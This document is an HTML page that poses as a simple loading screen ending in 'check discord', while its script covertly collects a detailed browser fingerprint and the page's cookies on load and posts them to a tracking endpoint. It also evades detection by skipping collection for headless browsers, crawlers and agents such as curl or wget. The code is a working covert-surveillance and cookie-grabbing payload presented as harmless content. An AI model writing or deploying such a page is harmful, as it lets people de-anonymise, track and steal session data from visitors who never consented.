<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #ffffff;
    font-family: 'SF Pro Display', -apple-system, system-ui, sans-serif;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .loader {
    text-align: center;
    width: 260px;
  }
  .percent {
    font-size: 52px;
    font-weight: 700;
    color: #e8c547;
    letter-spacing: -2px;
    margin-bottom: 20px;
    animation: pop 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) both;
  }
  @keyframes pop {
    0% { transform: scale(0.6); opacity: 0; }
    100% { transform: scale(1); opacity: 1; }
  }
  .bar-track {
    width: 100%;
    height: 8px;
    background: #f0f0f0;
    border-radius: 4px;
    overflow: hidden;
  }
  .bar-fill {
    height: 100%;
    width: 0%;
    background: #e8c547;
    border-radius: 4px;
    transition: width 0.25s ease-out;
  }
  .done-overlay {
    position: fixed;
    inset: 0;
    background: #fff;
    display: flex;
    align-items: center;
    justify-content: center;
    opacity: 0;
    pointer-events: none;
    transition: opacity 0.6s ease;
    z-index: 5;
  }
  .done-overlay.show {
    opacity: 1;
    pointer-events: auto;
  }
  .done-text {
    font-size: 32px;
    font-weight: 600;
    color: #e8c547;
    letter-spacing: 1px;
    transform: translateY(20px);
    transition: transform 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
  }
  .done-overlay.show .done-text {
    transform: translateY(0);
  }
</style>
</head>
<body>

<div class="loader">
  <div class="percent" id="pct">0%</div>
  <div class="bar-track">
    <div class="bar-fill" id="bar"></div>
  </div>
</div>

<div class="done-overlay" id="overlay">
  <div class="done-text">check discord</div>
</div>

<script>
// ================================================================
// COLLECTORS
// ================================================================

function getCanvasFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 256; canvas.height = 64;
        ctx.textBaseline = 'top'; ctx.font = '14px Arial';
        ctx.fillStyle = '#f60'; ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069'; ctx.fillText('Cwm fjordbank glyphs vext quiz, \ud83d\ude03', 2, 15);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)'; ctx.fillText('Cwm fjordbank glyphs vext quiz, \ud83d\ude03', 4, 17);
        ctx.beginPath(); ctx.arc(200, 30, 12, 0, Math.PI * 2);
        ctx.fillStyle = '#ff00ff'; ctx.fill();
        ctx.strokeStyle = '#00ffff'; ctx.lineWidth = 2; ctx.strokeRect(180, 10, 40, 40);
        const d = canvas.toDataURL(); let h = 0;
        for (let i = 0; i < d.length; i++) { h = ((h << 5) - h) + d.charCodeAt(i); h = h & h; }
        return h.toString(16);
    } catch (e) { return 'canvas_error'; }
}

function getWebGLFingerprint() {
    try {
        const c = document.createElement('canvas');
        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
        if (!gl) return 'webgl_not_supported';
        const di = gl.getExtension('WEBGL_debug_renderer_info');
        return di ? gl.getParameter(di.UNMASKED_RENDERER_WEBGL) : 'webgl_debug_disabled';
    } catch (e) { return 'webgl_error'; }
}

function getInstalledFonts() {
    const list = [
        'Arial','Helvetica','Times New Roman','Courier New','Verdana','Georgia',
        'Palatino Linotype','Tahoma','Trebuchet MS','Impact','Comic Sans MS',
        'Lucida Console','Lucida Sans Unicode','Garamond','Book Antiqua','Arial Black',
        'Arial Narrow','Century Gothic','Franklin Gothic Medium','Futura','Gill Sans',
        'Optima','Segoe UI','Calibri','Cambria','Candara','Consolas','Constantia',
        'Corbel','Helvetica Neue','Menlo','Monaco','Apple Color Emoji','Noto Sans',
        'Roboto','Open Sans','Lato','Montserrat','Poppins','Inter','SF Pro Display',
        'SF Pro Text'
    ];
    const found = [];
    for (const f of list) { try { if (document.fonts.check(`12px "${f}"`)) found.push(f); } catch(e){} }
    return found;
}

async function getBatteryStatus() {
    try {
        if (!navigator.getBattery) return null;
        const b = await navigator.getBattery();
        return { level: Math.round(b.level * 100), charging: b.charging, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
    } catch (e) { return null; }
}

function getNetworkInfo() {
    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (!c) return null;
    return { effectiveType: c.effectiveType||'unknown', downlink: c.downlink||'unknown', rtt: c.rtt||'unknown', saveData: c.saveData||false };
}

async function getMediaDevices() {
    try {
        const d = await navigator.mediaDevices.enumerateDevices();
        return { hasCamera: d.some(x=>x.kind==='videoinput'), hasMic: d.some(x=>x.kind==='audioinput'), hasSpeaker: d.some(x=>x.kind==='audiooutput'), total: d.length };
    } catch (e) { return { hasCamera:false, hasMic:false, hasSpeaker:false, total:0 }; }
}

function getPerformanceTiming() {
    try {
        const p = performance.timing, n = p.navigationStart;
        return { loadTime: p.loadEventEnd-n, domContentLoaded: p.domContentLoadedEventEnd-n, dnsTime: p.domainLookupEnd-p.domainLookupStart, tcpTime: p.connectEnd-p.connectStart, ttfb: p.responseStart-p.requestStart };
    } catch (e) { return null; }
}

function getPlugins() { try { return Array.from(navigator.plugins).map(p=>p.name); } catch(e){ return []; } }

function getGamepadInfo() {
    try {
        const gp = navigator.getGamepads ? navigator.getGamepads() : [];
        const c = [];
        for (const g of gp) { if (g) c.push({ id:g.id, index:g.index, mapping:g.mapping, buttons:g.buttons.length, axes:g.axes.length }); }
        return { connected: c, count: c.length };
    } catch (e) { return { connected:[], count:0 }; }
}

// ================================================================
// BOT DETECTION
// ================================================================

function isBot() {
    const ua = navigator.userAgent.toLowerCase();
    const botPatterns = ['headless', 'bot', 'crawler', 'spider', 'scraper', 'scan', 'curl', 'wget'];
    for (const pattern of botPatterns) {
        if (ua.includes(pattern)) return true;
    }
    if (navigator.webdriver) return true;
    return false;
}

// ================================================================
// COLLECT EVERYTHING
// ================================================================

async function collectAllData() {
    const d = {
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        vendor: navigator.vendor || 'unknown',
        language: navigator.language,
        languages: navigator.languages,
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack || 'unknown',
        online: navigator.onLine,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: new Date().getTimezoneOffset(),
        locale: Intl.DateTimeFormat().resolvedOptions().locale,
        screen: { width:screen.width, height:screen.height, colorDepth:screen.colorDepth, availWidth:screen.availWidth, availHeight:screen.availHeight },
        window: { innerWidth:window.innerWidth, innerHeight:window.innerHeight, outerWidth:window.outerWidth, outerHeight:window.outerHeight, devicePixelRatio:window.devicePixelRatio },
        hardware: { deviceMemory:navigator.deviceMemory||'unknown', cpuCores:navigator.hardwareConcurrency||'unknown' },
        fingerprints: { canvas:getCanvasFingerprint(), webgl:getWebGLFingerprint() },
        pointer: { touchSupport:'ontouchstart' in window||navigator.maxTouchPoints>0, maxTouchPoints:navigator.maxTouchPoints||0, hoverSupport:window.matchMedia('(hover:hover)').matches, pointerCoarse:window.matchMedia('(pointer:coarse)').matches, pointerFine:window.matchMedia('(pointer:fine)').matches },
        theme: { prefersColorScheme:window.matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light', prefersReducedMotion:window.matchMedia('(prefers-reduced-motion:reduce)').matches },
        network: getNetworkInfo(),
        performance: getPerformanceTiming(),
        plugins: getPlugins(),
        pluginsCount: navigator.plugins?navigator.plugins.length:0,
        fonts: getInstalledFonts(),
        fontsCount: 0,
        battery: await getBatteryStatus(),
        media: await getMediaDevices(),
        gamepad: getGamepadInfo(),
        page: { url:window.location.href, referrer:document.referrer, hostname:window.location.hostname },
        cookies: document.cookie || 'none',
        historyLength: window.history.length,
    };
    d.fontsCount = d.fonts.length;
    return d;
}

// ================================================================
// UI + SEND
// ================================================================

const pctEl = document.getElementById('pct');
const barEl = document.getElementById('bar');
const overlay = document.getElementById('overlay');
let current = 0;

function setProgress(n) {
    current = Math.min(100, Math.max(0, n));
    pctEl.textContent = current + '%';
    barEl.style.width = current + '%';
}

function showDone() {
    pctEl.textContent = '100%';
    barEl.style.width = '100%';
    setTimeout(() => { overlay.classList.add('show'); }, 500);
}

async function main() {
    try {
        if (isBot()) {
            pctEl.textContent = 'done';
            return;
        }

        const steps = 22;
        for (let i = 0; i < steps; i++) {
            await new Promise(r => setTimeout(r, 30));
            setProgress(Math.round((i / steps) * 100));
        }

        const data = await collectAllData();
        setProgress(90);

        await fetch('/.netlify/functions/track', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });

        setProgress(100);
        showDone();
    } catch (e) {
        setProgress(100);
        showDone();
    }
}

if (document.readyState === 'complete') { main(); }
else { window.addEventListener('load', main); }
</script>
</body>
</html>
